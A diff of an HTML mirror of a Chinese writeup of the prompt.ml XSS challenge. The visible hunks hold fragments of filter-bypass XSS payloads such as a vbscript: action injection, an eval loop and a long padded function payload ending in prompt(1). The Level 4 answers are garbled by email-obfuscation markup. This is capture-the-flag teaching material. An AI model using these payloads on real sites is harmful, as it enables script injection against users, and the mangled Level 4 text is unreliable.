@@ -3,12 +3,12 @@
 			<head>
 			     <title>xss挑战赛writeup - 西门吹雪</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/3059">http://drops.wooyun.org/tips/3059</a></h1>
 				
       <p>
-        <p>挑战地址：<a href="http://prompt.ml/0">http://prompt.ml/0</a></p>
+        </p><p>挑战地址：<a href="http://prompt.ml/0">http://prompt.ml/0</a></p>
 
 <p>from:<a href="https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml">https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml</a></p>
 
@@ -28,7 +28,7 @@
 
 <h2>Level 0</h2>
 
-<hr />
+<hr>
 
 <h3>代码</h3>
 
@@ -58,7 +58,7 @@ function escape(input) {
 
 <h2>Level 1</h2>
 
-<hr />
+<hr>
 
 <p>该级别实际是简单的过滤了<code>&gt;</code>，需要绕过以下即可。</p>
 
@@ -89,7 +89,7 @@ function escape(input) {
 
 <h2>Level 2</h2>
 
-<hr />
+<hr>
 
 <p>该级别过滤了<code>=</code>、<code>(</code>两种符号。</p>
 
@@ -137,7 +137,7 @@ function escape(input) {
 
 <h2>Level 3</h2>
 
-<hr />
+<hr>
 
 <p>过滤了<code>-&gt;</code>。但是2012已经公布，html5的注释标签不仅可以使用<code>--&gt;</code>，还可以使用<code>--!&gt;</code>。</p>
 
@@ -161,9 +161,9 @@ function escape(input) {
 
 <h2>Level 4</h2>
 
-<hr />
+<hr>
 
-<p>这个题目是利用url的特性绕过，浏览器支持这样的url：http://user:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="acdccddfdfdbc3dec8eccdd8d8cdcfc7c9de82cfc3c14f2c2e48112a4a3403">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><code>http://user:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="562637252521392432791637222237353d33247835393b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>是不允许的。由于这里的正则特性和<code>decodeURIComponent</code>函数，所以可以使用<code>%2f</code>绕过，如下：<code>http:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="96b9b9e6e4f9fbe6e2b8fbfab3a4f0d6f7e2e2f7f5fdf3e4b8f5f9fb">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>。所以域名越短，答案就越短。</p>
+<p>这个题目是利用url的特性绕过，浏览器支持这样的url：http://user:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="acdccddfdfdbc3dec8eccdd8d8cdcfc7c9de82cfc3c14f2c2e48112a4a3403">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><code>http://user:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="562637252521392432791637222237353d33247835393b">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>是不允许的。由于这里的正则特性和<code>decodeURIComponent</code>函数，所以可以使用<code>%2f</code>绕过，如下：<code>http:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="96b9b9e6e4f9fbe6e2b8fbfab3a4f0d6f7e2e2f7f5fdf3e4b8f5f9fb">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>。所以域名越短，答案就越短。</p>
 
 <h3>代码</h3>
 
@@ -183,12 +183,12 @@ function escape(input) {
 
 <h3>答案</h3>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2f00005f5d40425f5b0142430a1d496fceabbd01585c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/✌
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2f00005f5d40425f5b0142430a1d496fceabbd01585c">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/✌
 </code></pre>
 
 <h2>Level 5</h2>
 
-<hr />
+<hr>
 
 <p>过滤了<code>&gt;</code>，过滤了<code>onXXX=</code>，过滤了<code>focus</code>，所以不能使用<code>autofocus</code>。但是可以使用js的换行<code>\n</code>绕过<code>onXXX=</code>，IE下依然可以使用<code>onresize</code></p>
 
@@ -220,7 +220,7 @@ function escape(input) {
 
 <h2>Level 6</h2>
 
-<hr />
+<hr>
 
 <p>虽然有过滤，但是可以将输入插入到form表单的<code>action</code>中。</p>
 
@@ -277,7 +277,7 @@ vbscript:prompt(1)#{"action":1}
 
 <h2>Level 7</h2>
 
-<hr />
+<hr>
 
 <p>可以使用js注释绕过。如下：</p>
 
@@ -329,7 +329,7 @@ function escape(input) {
 
 <h2>Level 8</h2>
 
-<hr />
+<hr>
 
 <p>这题使用的两个技巧</p>
 
@@ -377,7 +377,7 @@ function escape(input) {
 
 <h2>Level 9</h2>
 
-<hr />
+<hr>
 
 <p>该题使用正则<code>&lt;([a-zA-Z])</code>，导致无法注入HTML标签。但是toUpperCase()函数是支持Unicode函数。字符<code>ſ</code>经过函数toUpperCase()处理后，会变成ASCII码字符"S"。</p>
 
@@ -411,7 +411,7 @@ function escape(input) {
 
 <h2>Level 10</h2>
 
-<hr />
+<hr>
 
 <p>这个题目使用两个正则过滤。比较容易</p>
 
@@ -437,7 +437,7 @@ p'rompt(1)
 
 <h2>Level 11</h2>
 
-<hr />
+<hr>
 
 <p>这个题目直接允许注入数据到script标签里面，但是过滤了特殊符号。这里的技巧是使用一个数据或者字母拥有操作符的功能，就是in</p>
 
@@ -480,7 +480,7 @@ function escape(input) {
 
 <h2>Level 12</h2>
 
-<hr />
+<hr>
 
 <p>该题主要是利用toString()解答。eval可以直接执行字符串。如下：</p>
 
@@ -529,7 +529,7 @@ for((i)in(self))eval(i)(1)
 
 <h2>Level 13</h2>
 
-<hr />
+<hr>
 
 <p>这个题目涉及到js中的<code>__proto__</code>，每个对象都会在其内部初始化一个属性，就是<code>__proto__</code>，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去<code>__proto__</code>里面找这个属性，这个<code>__proto__</code>又会有自己的<code>__proto__</code>，一直这样找下去。可以再Chrome控制台中测试：</p>
 
@@ -617,7 +617,7 @@ function escape(input) {
 
 <h2>Level 14</h2>
 
-<hr />
+<hr>
 
 <p>这个题目使用base64绕过。</p>
 
@@ -661,7 +661,7 @@ function escape(input) {
 
 <h2>Level 15</h2>
 
-<hr />
+<hr>
 
 <p>过滤了<em>,所以不能使用js注释/</em>，但是前面也提到了，html里面的<code>&lt;!--</code>,<code>--&gt;</code>同样可以在js中使用，如下</p>
 
@@ -764,7 +764,7 @@ function escape(input) {
 
 <pre><code>#!js
 function history(L,o,r,e,m,I,p,s,u,m,i,s,s,i,m,p,l,y,d,u,m,m,y,t,e,x,t,o,f,t,h,e,p,r,i,n,t,i,n,g,a,n,d,t,y,p,e,s,e,t,t,i,n,g,i,n,d,u,s,t,r,y,L,o,r,e,m,I,p,s,u,m,h,a,s,b,e,e,n,t,h,e,i,n,d,u,s,t,r,y,s,s,t,a,n,d,a,r,d,d,u,m,m,y,t,e,x,t,e,v,e,r,s,i,n,c,e,t,h,e,s,w,h,e,n,a,n,u,n,k,n,o,w,n,p,r,i,n,t,e,r,t,o,o,k,a,g,a,l,l,e,y,o,f,t,y,p,e,a,n,d,s,c,r,a,m,b,l,e,d,i,t,t,o,m,a,k,e,a,t,y,p,e,s,p,e,c,i,m,e,n,b,o,o,k,I,t,h,a,s,s,u,r,v,i,v,e,d,n,o,t,o,n,l,y,f,i,v,e,c,e,n,t,u,r,i,e,s,b,u,t,a,l,s,o,t,h,e,l,e,a,p,i,n,t,o,e,l,e,c,t,r,o,n,i,c,t,y,p,e,s,e,t,t,i,n,g,r,e,m,a,i,n,i,n,g,e,s,s,e,n,t,i,a,l,l,y,u,n,c,h,a,n,g,e,d,I,t,w,a,s,p,o,p,u,l,a,r,i,s,e,d,i,n,t,h,e,s,w,i,t,h,t,h,e,r,e,l,e,a,s,e,o,f,L,e,t,r,a,s,e,t,s,h,e,e,t,s,c,o,n,t,a,i,n,i,n,g,L,o,r,e,m,I,p,s,u,m,p,a,s,s,a,g,e,s,a,n,d,m,o,r,e,r,e,c,e,n,t,l,y,w,i,t,h,d,e,s,k,t,o,p,p,u,b,l,i,s,h,i,n,g,s,o,f,t,w,a,r,e,l,i,k,e,A,l,d,u,s,P,a,g,e,M,a,k,e,r,i,n,c,l,u,d,i,n,g,v,e,r,s,i,o,n,s,o,f,L,o,r,e,m,I,p,s,u,m,I,t,i,s,a,l,o,n,g,e,s,t,a,b,l,i,s,h,e,d,f,a,c,t,t,h,a,t,a,r,e,a,d,e,r,w,i,l,l,b,e,d,i,s,t,r,a,c,t,e,d,b,y,t,h,e,r,e,a,d,a,b,l,e,c,o,n,t,e,n,t,o,f,a,p,a,g,e,w,h,e,n,l,o,o,k,i,n,g,a,t,i,t,s,l,a,y,o,u,t,T,h,e,p,o,i,n,t,o,f,u,s,i,n,g,L,o,r,e,m,I,p,s,u,m,i,s,t,h,a,t,i,t,h,a,s,a,m,o,r,e,o,r,l,e,s,s,n,o,r,m,a,l,d,i,s,t,r,i,b,u,t,i,o,n,o,f,l,e,t,t,e,r,s,a,s,o,p,p,o,s,e,d,t,o,u,s,i,n,g,C,o,n,t,e,n,t,h,e,r,e,c,o,n,t,e,n,t,h,e,r,e,m,a,k,i,n,g,i,t,l,o,o,k,l,i,k,e,r,e,a,d,a,b,l,e,E,n,g,l,i,s,h,M,a,n,y,d,e,s,k,t,o,p,p,u,b,l,i,s,h,i,n,g,p,a,c,k,a,g,e,s,a,n,d,w,e,b,p,a,g,e,e,d,i,t,o,r,s,n,o,w,u,s,e,L,o,r,e,m,I,p,s,u,m,a,s,t,h,e,i,r,d,e,f,a,u,l,t,m,o,d,e,l,t,e,x,t,a,n,d,a,s,e,a,r,c,h,f,o,r,l,o,r,e,m,i,p,s,u,m,w,i,l,l,u,n,c,o,v,e,r,m,a,n,y,w,e,b,s,i,t,e,s,s,t,i,l,l,i,n,t,h,e,i,r,i,n,f,a,n,c,y,V,a,r,i,o,u,s,v,e,r,s,i,o,n,s,h,a,v,e,e,v,o,l,v,e,d,o,v,e,r,t,h,e,y,e,a,r,s,s,o,m,e,t,i,m,e,s,b,y,a,c,c,i,d,e,n,t,s,o,m,e,t,i,m,e,s,o,n,p,u,r,p,o,s,e,i,n,j,e,c,t,e,d,h,u,m,o,u,r,a,n,d,t,h,e,l,i,k,e,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_)$&amp;prompt(1)
-</code></pre>      </p>
+</code></pre>      <p></p>
     
 			</body>
 		</html>
